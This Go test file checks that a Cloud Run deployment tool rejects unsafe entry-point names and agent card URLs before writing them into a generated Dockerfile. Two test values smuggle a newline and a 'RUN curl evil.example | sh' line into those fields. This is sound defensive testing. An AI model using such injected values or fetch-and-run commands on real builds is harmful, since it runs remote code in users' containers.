// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cloudrun

import (
	"strings"
	"testing"
)

// resetFlags restores the package-level flags var to a fresh, minimally
// valid state before each test, since computeFlags reads/writes it directly.
func resetFlags(t *testing.T, entryPointPath, a2aAgentCardURL string) {
	t.Helper()
	tempDir := t.TempDir()
	flags = deployCloudRunFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = tempDir
	flags.cloudRun.a2aAgentCardURL = a2aAgentCardURL
}

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, which is
	// embedded directly into the generated Dockerfile's COPY/CMD lines.
	maliciousEntryPoint := "main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint, "http://127.0.0.1:8081")

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), "entry point") {
		t.Errorf("computeFlags() error = %v, want it to mention the entry point", err)
	}
}

func TestComputeFlags_RejectsUnsafeA2AAgentCardURL(t *testing.T) {
	maliciousURL := `http://127.0.0.1:8081"]` + "\nRUN curl evil.example | sh\n#"
	resetFlags(t, "main.go", maliciousURL)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --a2a_agent_url value")
	}
	if !strings.Contains(err.Error(), "a2a_agent_url") {
		t.Errorf("computeFlags() error = %v, want it to mention --a2a_agent_url", err)
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go", "http://127.0.0.1:8081")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
}
